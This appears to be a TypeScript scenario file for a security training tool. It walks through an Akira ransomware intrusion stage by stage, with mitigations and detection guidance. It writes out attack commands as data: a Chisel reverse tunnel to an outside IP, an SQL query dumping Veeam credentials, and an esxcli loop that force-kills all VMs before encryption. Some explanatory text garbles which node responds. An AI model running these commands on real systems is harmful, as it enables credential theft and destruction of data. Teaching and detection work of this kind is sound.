import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'akira-ransomware-cisco-anyconnect-esxi',
    title: 'Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Akira ransomware affiliates breach perimeter Cisco ASA/FTD AnyConnect VPN appliances (CVE-2020-3259 / CVE-2023-20269), establish Chisel/ngrok tunnels, extract VMware vCenter/ESXi credentials, run esxcli vm process kill on hypervisors, and deploy the Rust/C++ Akira ESXi encryptor.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Akira Affiliate Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Cisco ASA / AnyConnect VPN Appliance', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Windows Jump Host (Chisel & Mimikatz)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-109A / Sophos MDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'VMware ESXi Host (esxcli + Rust Akira)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)',
        narration:
          'Akira affiliates exploit CVE-2023-20269 (unauthorized brute-force/access on Cisco ASA/FTD SSL VPN) or CVE-2020-3259 memory disclosure to authenticate to a single-factor AnyConnect VPN profile without MFA.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1133 - External Remote Services / T1190)',
        technicalCommands: [
          'GET /+CSCOE+/session_password.html HTTP/1.1 (Cisco ASA AnyConnect SSL VPN Login)',
          'Exploit CVE-2023-20269 / CVE-2020-3259 -> Establish AnyConnect DTLS tunnel',
        ],
        defenseMitigation:
          'Patch Cisco ASA/FTD firmware for CVE-2023-20269 and CVE-2020-3259, disable legacy DefaultWEBVPNGroup profiles, and require phishing-resistant MFA on all VPN connection profiles.',
        logs: [
          {
            id: 'akira-1',
            timestamp: '01:14:09.104',
            source: 'Firewall',
            severity: 'critical',
            raw: '%ASA-6-722022: Group <DefaultWEBVPNGroup> User <vendor_support> IP <185.220.101.42> SVC Message: 16/NOTICE: The user has connected | MFA: None (CVE-2023-20269)',
            parsedFields: {
              Appliance: 'Cisco ASA / Firepower Threat Defense',
              VpnGroup: 'DefaultWEBVPNGroup',
              ExploitedCve: 'CVE-2023-20269 / CVE-2020-3259',
              AdvisoryId: 'CISA AA24-109A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi',
        narration:
          'Pivoting onto an internal Windows server, the operator runs Chisel to establish a reverse SOCKS5 proxy over HTTP, extracts stored credentials from the Veeam Backup SQL database and LSASS, and opens an SSH session to the VMware ESXi hypervisors.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Credential Access & Command and Control (T1555 / T1572)',
        technicalCommands: [
          'chisel.exe client https://185.220.101.42:8443 R:socks',
          'sqlcmd -S localhost\\VEEAMSQL2016 -Q "SELECT user_name, password FROM [VeeamBackup].[dbo].[Credentials]"',
        ],
        defenseMitigation:
          'Isolate Veeam backup servers and ESXi management interfaces (`vmk0`) onto dedicated out-of-band management VLANs and disable ESXi SSH (`TSM-SSH`) by default.',
        logs: [
          {
            id: 'akira-2',
            timestamp: '01:28:33.719',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'chisel.exe',
            CommandLine: 'C:\\ProgramData\\chisel.exe client https://185.220.101.42:8443 R:socks',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\chisel.exe | CommandLine: chisel.exe client https://185.220.101.42:8443 R:socks | FollowUp: VeeamBackup Credentials SQL query & SSH to ESXi hypervisor',
            parsedFields: {
              TunnelTool: 'Chisel (HTTP Reverse SOCKS5 Proxy)',
              CredentialSource: 'VeeamBackup SQL Database ([dbo].[Credentials])',
              LateralProtocol: 'SSH (TCP/22) to VMware ESXi Host',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption',
        narration:
          'On the ESXi hypervisor shell, the operator runs a one-line loop invoking esxcli vm process list and esxcli vm process kill --type=force to immediately power off all running virtual machines (unlocking their .vmdk files), then launches the Rust-compiled Akira ELF binary (`megazord` / `akira_esxi`) to encrypt `/vmfs/volumes`.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Impact (T1489 - Service Stop / T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'for i in $(esxcli vm process list | grep "World ID:" | awk \'{print $3}\'); do esxcli vm process kill --type=force --world-id=$i; done',
          'nohup /tmp/akira_esxi -p /vmfs/volumes --fork & (Encrypts .vmdk, .vmx, .vswp, .vmsn with ChaCha20/RSA)',
        ],
        defenseMitigation:
          'Enable vSphere 8+ Lockdown Mode (disabling direct root SSH access to ESXi hosts) and forward `/var/log/shell.log` in real time to alert on `esxcli vm process list/kill`.',
        logs: [
          {
            id: 'akira-3',
            timestamp: '01:41:12.005',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'esxcli',
            CommandLine: 'esxcli vm process kill --type=force --world-id=2104892',
            raw: 'ESXi /var/log/shell.log Alert | User: root | Command: esxcli vm process kill --type=force --world-id=2104892 | NextCommand: /tmp/akira_esxi -p /vmfs/volumes --fork | TargetFiles: *.vmdk, *.vmx -> *.akira',
            parsedFields: {
              VmTerminationCommand: 'esxcli vm process kill --type=force',
              HypervisorEncryptor: '/tmp/akira_esxi (Rust ELF Binary)',
              TargetedDatastores: '/vmfs/volumes (*.vmdk, *.vmx, *.vswp)',
            },
          },
        ],
        packets: [],
      },
    ],
  };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'akira-ransomware-cisco-anyconnect-esxi',
    briefing: {
      headline:
        'Akira ransomware affiliates breach Cisco ASA/FTD AnyConnect VPN appliances (CVE-2023-20269 / CVE-2020-3259), tunnel via Chisel, dump Veeam backup credentials, run esxcli vm process kill on VMware ESXi hypervisors, and deploy the Rust Akira ESXi encryptor (AA24-109A).',
      storyAnalogy:
        'Imagine a heist crew slips through an old side gate (DefaultWEBVPNGroup) on the perimeter wall that forgot to ask for a second ID factor, digs an underground tunnel (Chisel), steals the master key ring from the backup vault (Veeam SQL DB), walks straight into the power plant running all the virtual offices (VMware ESXi), flips the main breaker on every running virtual office (esxcli vm process kill), and padlocks their hard drives.',
      plainSummary:
        'In this scenario (T1133, Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: cisco ASA / AnyConnect Single-Factor VPN, then chisel SOCKS Tunneling, Veeam Credential, then esxcli vm process kill. Steps #1–#3 walk that chain end-to-end by covering Cisco ASA / AnyConnect Single-Factor VPN, then Chisel SOCKS Tunneling, Veeam Credential, then esxcli vm process kill, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'Akira Affiliate Operator -> Cisco ASA / AnyConnect VPN Appliance -> Windows Jump Host (Chisel & Mimikatz) -> VMware ESXi Host (esxcli + Rust Akira) -> CISA AA24-109A / Sophos MDR Sensor.',
      documentedAdvisory:
        'CISA / FBI / Europol Joint Advisory AA24-109A (#StopRansomware: Akira) / Cisco CVE-2023-20269 / Sophos X-Ops Akira Report',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1133',
        plainTitle: 'Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)',
        storyAnalogy:
          'Even if the main employee VPN entrance requires a smartphone push code, the firewall still has a hidden default entrance (DefaultWEBVPNGroup) that accepts a password alone.',
        simpleExplanation:
          'Akira affiliates targeted WAN-facing Cisco ASA and Firepower Threat Defense (FTD) appliances, exploiting CVE-2020-3259 (an unauthenticated memory disclosure vulnerability that leaks active session tokens and credentials from ASA memory) or CVE-2023-20269 (an authorization bypass allowing brute-force and password-spray authentication against the built-in DefaultWEBVPNGroup connection profile without triggering MFA), establishing an encrypted AnyConnect VPN session.',
        howItWorksInPractice:
          'Many administrators configured Duo/Azure MFA on their custom VPN tunnel group (Corp-MFA-Tunnel) but left the built-in DefaultWEBVPNGroup or DefaultRAGroup active with local/LDAP password-only authentication. In the documented Firewall exchange from Akira Affiliate Operator to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1133 (confirming that the Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Akira Affiliate Operator to the Cisco ASA / AnyConnect VPN Appliance over TCP/UDP 443.',
        detectionAndEvidence:
          'Monitor Cisco ASA syslog events %ASA-6-722022 and %ASA-6-113004 (which log AnyConnect IP assignment and group authentication) for logins hitting DefaultWEBVPNGroup or DefaultRAGroup from external hosting ASNs without MFA (detecting initial Akira perimeter entry). Correlate Sysmon or Windows Security Event telemetry for T1133 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1555',
        plainTitle: 'Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi',
        storyAnalogy:
          'Landing on a Windows server, the attacker sets up a hidden proxy pipe and raids the backup server’s database, which conveniently holds the root password to the VMware hypervisors.',
        simpleExplanation:
          'Pivoting to an internal Windows server, the operator launched chisel.exe client https://<c2>:8443 R:socks (establishing a fast TCP-over-HTTP/WebSocket reverse SOCKS5 tunnel) and queried the local VeeamBackup Microsoft SQL database (SELECT user_name, password FROM [VeeamBackup].[dbo].[Credentials], decrypting the DPAPI-protected blobs to recover the cleartext root SSH credentials and vCenter service accounts used by Veeam to snapshot VMware ESXi hosts).',
        howItWorksInPractice:
          'Because backup servers require high-privilege access to every hypervisor and domain controller to perform backups, compromising the Veeam database gives the attacker immediate Tier-0 hypervisor credentials. In the documented EventID 1 exchange from Perimeter Firewall & NDR Tap to Cisco ASA / AnyConnect VPN Appliance, Cisco ASA / AnyConnect VPN Appliance responds with ACK 1 (confirming that the C:\ProgramData\chisel.exe client https://185.220.101.42:8443 R:socks request succeeded on Cisco ASA / AnyConnect VPN Appliance and establishing the runtime state required for Step #3 Stage 3: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Cisco ASA VPN to the Windows Jump Host (Chisel & Mimikatz) and triggers the CISA AA24-109A / Sophos MDR Sensor.',
        detectionAndEvidence:
          'Sysmon EventID 1 for chisel.exe or sqlcmd.exe querying [VeeamBackup].[dbo].[Credentials] and DPAPI CryptUnprotectData calls on the Veeam server.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1489',
        plainTitle: 'esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption',
        storyAnalogy:
          'Instead of breaking into 100 individual virtual servers, the attacker logs into the single physical host running all 100 of them, yanks their power cords (esxcli vm process kill), and encrypts their virtual hard drive files.',
        simpleExplanation:
          'Using the stolen ESXi credentials over SSH, the operator executed a shell loop invoking esxcli vm process list and esxcli vm process kill --type=force --world-id=<id> (forcefully terminating every running vmx virtual machine hypervisor process so the ESXi kernel releases its exclusive file locks on .vmdk and .vswp virtual disk files) and launched the Rust-compiled Akira ELF encryptor (/tmp/akira_esxi -p /vmfs/volumes --fork, encrypting all datastore volumes with ChaCha20/RSA-4096).',
        howItWorksInPractice:
          'Because most enterprises do not install EDR agents directly inside the proprietary VMware ESXi VMkernel OS, encrypting from the hypervisor shell bypasses all guest-OS Windows/Linux EDR agents installed inside the VMs. In the documented EventID 1 exchange from Cisco ASA / AnyConnect VPN Appliance to Windows Jump Host (Chisel & Mimikatz), Windows Jump Host (Chisel & Mimikatz) responds with ALERT 1 (confirming that the esxcli vm process kill --type=force --world-id=2104892 request succeeded on Windows Jump Host (Chisel & Mimikatz) and completing the final execution objective of Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the SSH pivot from the Windows Jump Host to the VMware ESXi Host (esxcli + Rust Akira).',
        detectionAndEvidence:
          'Forward ESXi /var/log/shell.log and /var/log/hostd.log off-host to a central SIEM (preserving hypervisor audit records before local wipe) and alert immediately on esxcli vm process kill bursts paired with unsigned ELF binaries executing from /tmp. Correlate Sysmon or Windows Security Event telemetry for T1489 (pairing parent/child process and destination fields) and contain the offending session.',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a corporate data center whose front lobby keycard reader still honors single-factor staff passwords without a pocket code. A burglar slips through the lobby door, threads a hidden garden hose out through a back vent to bring in extra helpers, raids the backup-vault clerk desk to steal the master building-basement keys, and then marches down to the basement to shut off every virtual apartment simultaneously and padlock their heavy foundation files.',
      storyMappings: [
        {
          storyTerm: 'Front lobby door accepting single-factor passwords',
          technicalTerm: 'Cisco ASA / FTD AnyConnect SSLVPN breach via CVE-2023-20269 or CVE-2020-3259',
          tone: 'amber',
        },
        {
          storyTerm: 'Hidden garden hose threaded out through a back vent',
          technicalTerm: 'chisel.exe reverse SOCKS tunnel bridging attacker tools into the internal LAN',
          tone: 'sky',
        },
        {
          storyTerm: 'Raiding the backup-vault clerk desk for basement keys',
          technicalTerm: 'Dumping [VeeamBackup].[dbo].[Credentials] via sqlcmd.exe and DPAPI decryption',
          tone: 'rose',
        },
        {
          storyTerm: 'Shutting off every virtual apartment and padlocking foundation files',
          technicalTerm: 'SSH esxcli vm process kill followed by Rust-based Akira ESXi VMDK encryption',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Testing the exterior remote-access lobby door from an outside commercial warehouse, the intruder exploits a flaw in the single-password gate and walks cleanly into the internal office corridor without ever passing a second-factor badge check.',
        storyMappings: [
          {
            storyTerm: 'Exterior remote-access lobby door',
            technicalTerm: 'WAN-facing Cisco ASA or Firepower Threat Defense (FTD) AnyConnect VPN',
            tone: 'amber',
          },
          {
            storyTerm: 'Single-password gate flaw',
            technicalTerm: 'CVE-2023-20269 / CVE-2020-3259 or credential stuffing against non-MFA VPN groups',
            tone: 'sky',
          },
          {
            storyTerm: 'Outside commercial warehouse',
            technicalTerm: 'External VPS and commercial hosting ASNs initiating VPN sessions',
            tone: 'rose',
          },
          {
            storyTerm: 'Lobby guard book recording the unusual entry',
            technicalTerm: 'Cisco ASA syslog %ASA-6-722022 and %ASA-6-113004 authentication events',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Monitor Cisco ASA syslog events %ASA-6-722022 and %ASA-6-113004 (which log AnyConnect IP assignment and group authentication) for logins hitting DefaultWEBVPNGroup or DefaultRAGroup from external hosting ASNs without MFA (detecting initial Akira perimeter entry).',
      },
      2: {
        storyAnalogy:
          'Once inside the building, the intruder snakes a concealed reverse speaking tube out to their hideout, then visits the corporate backup-scheduler office to unlock its credential safe and lift the master keys to the basement hypervisor racks.',
        storyMappings: [
          {
            storyTerm: 'Concealed reverse speaking tube out to the hideout',
            technicalTerm: 'chisel.exe client https://<c2>:8443 R:socks reverse SOCKS proxy',
            tone: 'amber',
          },
          {
            storyTerm: 'Corporate backup-scheduler credential safe',
            technicalTerm: 'Veeam Backup SQL table [VeeamBackup].[dbo].[Credentials] queried via sqlcmd.exe',
            tone: 'sky',
          },
          {
            storyTerm: 'Unwrapping the locked backup safe keys',
            technicalTerm: 'DPAPI CryptUnprotectData decryption of stored vCenter and ESXi root passwords',
            tone: 'rose',
          },
          {
            storyTerm: 'Stairwell leading straight to the basement racks',
            technicalTerm: 'Lateral SSH pivot directly onto VMware ESXi hypervisor management interfaces',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Alert on Sysmon EventID 1 (Process Creation recording command lines) for chisel.exe reverse proxy launches or sqlcmd.exe querying [VeeamBackup].[dbo].[Credentials] paired with unexpected DPAPI CryptUnprotectData calls on the Veeam backup server (catching hypervisor credential theft).',
      },
      3: {
        storyAnalogy:
          'Descending into the basement hypervisor hall with stolen master keys, the intruder flips the hard power breakers on every running virtual office so their disk bolts release, then unleashes a fast Rust padlocking machine that encrypts entire virtual servers in minutes.',
        storyMappings: [
          {
            storyTerm: 'Flipping hard power breakers on running virtual offices',
            technicalTerm: 'Shell loop invoking esxcli vm process list and esxcli vm process kill --type=force',
            tone: 'amber',
          },
          {
            storyTerm: 'Releasing heavy disk bolts',
            technicalTerm: 'Releasing exclusive hypervisor locks held on *-flat.vmdk virtual disk files',
            tone: 'sky',
          },
          {
            storyTerm: 'Fast Rust padlocking machine',
            technicalTerm: 'Linux ELF Rust-compiled Akira ESXi encryptor launched from /tmp',
            tone: 'rose',
          },
          {
            storyTerm: 'Basement audit logs recording the shutdowns',
            technicalTerm: 'ESXi /var/log/shell.log and /var/log/hostd.log forwarded off-host to SIEM',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Forward ESXi /var/log/shell.log and /var/log/hostd.log off-host to a central SIEM (preserving hypervisor audit records before local wipe) and alert immediately on esxcli vm process kill bursts paired with unsigned ELF binaries executing from /tmp.',
      },
    },
  };
